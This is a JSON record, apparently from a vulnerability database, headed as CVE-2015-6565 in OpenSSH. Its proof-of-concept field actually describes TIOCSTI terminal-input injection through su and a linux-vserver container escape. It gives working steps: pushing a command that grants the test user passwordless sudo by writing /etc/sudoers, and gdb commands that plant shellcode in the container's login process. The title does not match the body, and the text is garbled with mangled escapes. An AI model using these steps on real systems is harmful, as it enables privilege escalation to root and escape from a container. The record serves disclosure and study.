{
    "text": "vul_name : OpenSSH 6.8-6.9 pty issue can lead to local privesc on Linux ， vul_cve : CVE-2015-6565 ， vul_poc : Problem description :  ， Most operating systems have tools to switch between user-space execution contexts with different privilege levels , e.g. su or tools to enter container virtualization execution context. Some of those tools , e.g su from package login 1 : 4.0.18.2-1ubuntu2.2 in ubuntu precise does not prevent tty input faking via TIOCSTI ioctl call after switching to another user ( context ) . When su -s /bin/bash [ user ] is called from interactive shell , the input queue data pushed back as the target user will be executed by the interactive shell calling su. Example :  ， root # su -s /bin/bash test ， test # ./TtyPushbackSignaling - $ 'echo \"test ALL=NOPASSWD : ALL\" /etc/sudoersnfg' ， ec [ 1 ] + Stopped su -s /bin/bash testho ， \"test Aroot # echo \"test ALL=NOPASSWD : > /etc/sudoers ， root # fg ， su -s /bin/bash test ， test #  ， Explanation : when user working as root switches to another user with su and happens to execute the pushback program as that user , the tty input data pushed back is executed in the shell and context of user root. ， Results ， The issue with su being susceptible to TIOCSTI issues was known before , see references below. A problem seems to be , that kernel API does not provide any countermeasures agains this attack , e.g. having multiple queues for each uid or sid level. The su binary on the other hand could also prevent this kind of attack , e.g. by creating a user-owned sub-pty and copying data from the sub-pty to the root-owned caller pty. But this solution is far more complex than a simple setuid/setgid and therefore currently not implemented. ， A similar issue also affects at least one container virtualization platform , that is linux vserver. When an administrator enters a guest , a malicious user inside guest may take over the /usr/sbin/vcontext process , which is named login inside the container. The process creates a new pty which is then used by the shell inside the container but the process still has to keep the old pty from outside open. Injection of code into runnling login process thus allows execution on host. Standard deb package util-vserver-core version 0.30.216-pre3038-1 for download via repo.psand.net ( see linux-vserver.org ) contain also a version of /usr/sbin/vcontext without ASLR and rwx-pages , so following steps allow execution outside container :  ， cat EOF > /x ，  #  ! /bin/bash ， exec /TtyPushbackSignaling -NoSignal - $ 'ntouch /xx-outsidenstty sane' ， EOF ， chmod 0755 /x ， gdb -pid [ pid of login process ]  ，  ( gdb ) set * 0x8051000=0x7880cd ，  ( gdb ) set * 0x8051004=0x8051002 ，  ( gdb ) set * 0x8051008=0 ，  ( gdb ) set $ eax=0x0b ，  ( gdb ) set $ ebx=0x8051002 ，  ( gdb ) set $ ecx=0x8051004 ，  ( gdb ) set $ edx=0x8051008 ，  ( gdb ) set $ eip=0x8051000 ，  ( gdb ) quit",
    "time": "2015.09.03"
}